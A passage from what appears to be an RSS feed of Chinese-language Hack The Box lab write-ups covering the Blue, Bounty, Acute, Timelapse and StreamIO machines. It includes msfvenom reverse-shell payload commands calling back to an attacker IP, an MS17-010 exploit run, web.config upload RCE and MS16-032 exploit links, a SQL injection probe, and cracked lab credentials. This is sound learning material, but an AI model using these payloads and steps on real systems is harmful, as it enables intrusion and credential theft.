&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb7cb4501d2f43017c75bef6bf5a87669image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;samdump2 读取hash:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa56df4487c87e17799af463c1dc86506image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;john破解ntml hash:&lt;/p&gt;
&lt;p&gt;bureaulampje     (L4mpje)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE391353a350aa7df977722483227b0e26image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ssh登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb22b71fa3836d077e80b209f723d6598image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X005 Blue</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x005-blue/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x005-blue/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2e5d325be6572acc6fe7225b6f12fc65image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE461282104c88e9e96c68c6156f40047fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb84c8731af18fe56ae61f82e2ca73235image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：&lt;/p&gt;
&lt;p&gt;但是尽量不适用msf吧：&lt;/p&gt;
&lt;p&gt;这个失败了：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/mez-0/MS17-010-Python&#34;&gt;https://github.com/mez-0/MS17-010-Python&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;换一个：&lt;/p&gt;
&lt;p&gt;简书的讲解：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/430b2bbfdecc&#34;&gt;https://www.jianshu.com/p/430b2bbfdecc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这种方式也失败了。&lt;/p&gt;
&lt;p&gt;最后使用了，这个办法：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfd8cb7031252cbea1d9f4dd8ba9d8171image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;生成一个木马：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3fb254004dfaa2ada5be2a32d11e02e3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;编辑zzz_exploit.py：&lt;/p&gt;
&lt;p&gt;添加两个\&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEaa8b069bbfe0c3ee2fbb90d26e55d862image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个位置，添加相关操作：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE80351537bd1389c2977159194987b2e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用vim可能会报错，可以使用记事本打开，可能是vim的问题：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE84dfc6938a3d156908ed49e5df31c8a3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;运行：&lt;/p&gt;
&lt;p&gt;python2 zzz_exploit.py 10.10.10.40 ntsvcs&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3cc53540399883ad12f7e55611bc064image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE06ae831433cd098b094bf047d02215f9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE89e4c49a655b9af459755049c3e3014fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X006 Bounty</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x006-bounty-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x006-bounty-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE50b73d52938f8dd92624582f43421360image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE158a53ed50b04b02fe88333a25910e95image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd074fad91d7ae895e3d24de42037f0c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有一个：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE290bef7cba7d9b437c8cef6f1fa1ed8aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先上传一个试试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEffd0b44cc682f4923731a293cd93e360image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE14cb2d762c34f76a20036fa7fc577504image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEff697c6b8d0b448688cc2c2d7b448c5eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看样子是后端校验：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE428c4be128599fd2c3cc19b820edbd6aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0ed7b3810f71f2d3a927add6bab5a3bbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt&lt;/p&gt;
&lt;p&gt;发现congfig是可以使用的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE381217727c5fde95497933ca69fb993aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个后缀在IIS7.0以上是可以getshell的：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/&#34;&gt;https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;同时可以在github找到相关项目：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/0xPurpl3john/web.config&#34;&gt;https://github.com/0xPurpl3john/web.config&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdaecd0d5ed32bb9f118511101dcba521image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcc32ac0e88720bca4d2ecdddfd9ff008image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE833669069ef148827677d372d1a1ae09image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdb6c7fb99adecbc38aae0f5bc2df1bfdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;也是没有补丁的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE39f51e9e0b66cda8726eba501f80d082image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/zcgonvh/MS16-032/releases/tag/Release&#34;&gt;https://github.com/zcgonvh/MS16-032/releases/tag/Release&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;运行之前需要重新弹个shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE13637ed094fc8cff71e82ec81c435a3aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a99ab8a07082ec27e2d6e7dddca9cc5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe66629d806b17a054946a7d51858ecd3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe1072ee6aeb1fa4934813b4752dee048image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE64af2bfec5388fe2617f3e5daaad784fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X007 Acute</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x007-acute/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x007-acute/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7bced707209a355e5b0d8e37665b10c6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1553e03a5a52725213cc98b0d93dad66image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe9bc11587966185546c54c64b1c03fdcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;端口扫描没发现东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc3827f6e5c0c0ed9fe650ad4b0d794b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开网站看一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfe70211233839785d604541ed4534e40image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改hosts:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd18aed551b61f788a2d4b032bd126d42image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里是我看到了，但是不知道怎么利用的：&lt;/p&gt;
&lt;p&gt;这里的用户名是看到了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7d4afbef001b7925f4b2b74890cd4006image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时，这个word也看到了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE738cf0d3e074876b486600fd30f2d176image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是没看文件属性：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba21a112c62051f8191d46bcefd555faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是文件内容，英语挺重要：&lt;/p&gt;
&lt;p&gt;原始密码是：Password1!&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93e40bc3cae9ca0fe0f345104db0c13fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里其实涉及了一个知识盲区，PSWA是什么东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7787611761e770eccc9a1a9242b89118image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdfad486d271f9e44031a5f10ab92d612image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后上面说到的会议连接在这里：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d920afa8c0b68c03132d544e4a4fb7aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开页面：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://atsserver.acute.local/Acute_Staff_Access&#34;&gt;https://atsserver.acute.local/Acute_Staff_Access&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE70c4428b1e1da9e3183cf2eb22a8ab8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里Computer name应该是Acute-PC01，是word里面的作者，密码是Password1!，账户是网页上的，但是经过尝试，均为失败：&lt;/p&gt;
&lt;p&gt;然后问了一下GPT：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd5435cb71dc3ff2e46c3830c9455a079image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;也就是说可能是这种变形：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc12c78fb2716be13fa889352ed571759image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;账户名是：EDavies&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE21116ef509fd1d912543fb44a5a5de8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;这里看是下载成功了，但是好像有杀软，被杀了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE711ea82608ebd740c11c84dc2ed4bf7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是我没想到的，我认为应该是进行免杀，但是作者是给了免杀目录的，我不太明白这是否具备普适性，所以我问了一下GPT：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa107fca6b135c6706f24712112b290bcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;所以还是英语不太好，吃大亏了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf62ff533327d3c3bdb581f11c9b0800image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用Get-ChildItem -Force可以查看隐藏文件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE56fea9b0b68d0d25947440b0deff30f2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;权限提升&lt;/h1&gt;
&lt;p&gt;好吧，这里还是没办法，参考官方文档，只能使用msf了：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X008 Timelapse</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x008-timelapse/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x008-timelapse/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE018e74c2d1d6b4774bee9e153f9fa396image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE971f10663a36b5709df0dd5fdc3b60c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE275264544e3a192dbc7b35ebacad3c79image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7e4e95320e2efb7e81cb3556d4704ff7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似重置后的密码？&lt;/p&gt;
&lt;p&gt;7c3XlgsE&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7987f78949a8217bb11355a4a8ca844eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3c4eeca319f202c25dab2bc1ec1e574dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEacda20c829e62857094e69c518ee487aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这东西怎么用呢，后面刚好培训遇到了，pfx是一种存储个人信息的文件，简单理解可以理解为ssh密钥文件，不过普遍都是加密状态，需要解密，破解使用john即可：&lt;/p&gt;
&lt;p&gt;thuglegacy&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4db93b4a2a32347beeac337f1e1ac932image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后需要将从pfx格式的文件，&lt;/p&gt;
&lt;p&gt;openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes&lt;/p&gt;
&lt;p&gt;openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4bf5687eb4cea770d74add9eb7c84c4fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3744727b51858143258abb2fdcf6a429image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;powershell历史文件位置：&lt;/p&gt;
&lt;p&gt;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&lt;/p&gt;
&lt;p&gt;可以看到账号密码：&lt;/p&gt;
&lt;p&gt;$p = ConvertTo-SecureString &amp;lsquo;E3R$Q62^12p7PLlC%KWaxuaV&amp;rsquo; -AsPlainText -Force&lt;/p&gt;
&lt;p&gt;$c = New-Object System.Management.Automation.PSCredential (&amp;lsquo;svc_deploy&amp;rsquo;, $p)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5315faf8cc6fcc4214a5969b8fa62464image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X009 StreamIO</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x009-streamio/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x009-streamio/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3257329be177fe9aef7e4aaf52293d27image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd3c1b4b24bc3595c19b76fd9c7a427e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbad7ae63e95fb7c7ab832c90dcb3c920image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;从端口开放情况来看，值得关注的端口有：80、389、443、445、3268、5985：&lt;/p&gt;
&lt;p&gt;先看445和389，3268等：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4a281f5b3be9d6918b712cc983ca01fdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf3f130c2816498be203fa0fb14fd62aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么突破口应该就在80或者443了：&lt;/p&gt;
&lt;p&gt;简单看了一下首页，没有东西，目录扫描看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0d40e50c454fdb84b6ec6ec134d9a84image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有注册和登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE17ea2ef4df506d9f2b6d590de8e8896fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;简单试了一下，好像没有万能密码，注册一个看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdfe5603f94b28380e2893807f702875aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不让登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbb1872229a80d5870f7a8b2c0ee61cadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看证书，发现域名好像不对：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE24fe63e5dd0fbbb8607cad6090bceda5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问这个网站：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf16ac18a8c8ec5e36e6e9823fed7ce1aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像也没有东西，再扫一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6e2747aa5f9e5ed0c57c279d3ecfb9ffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现新内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94b59761b65a13c2d34f8d708f1ce12dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似sql注入：&lt;/p&gt;
&lt;p&gt;输入1‘&amp;ndash;+&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3f154c70c42d264e0354e08271598deeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像有拦截：&lt;/p&gt;
&lt;p&gt;order by用不了，只能用select  挨个操作：&lt;/p&gt;
&lt;p&gt;测了半天，发现是个sqlserver:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd3526c4ab1b930e13333a6ba8fcc7230image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;当前数据库名称为&lt;/p&gt;
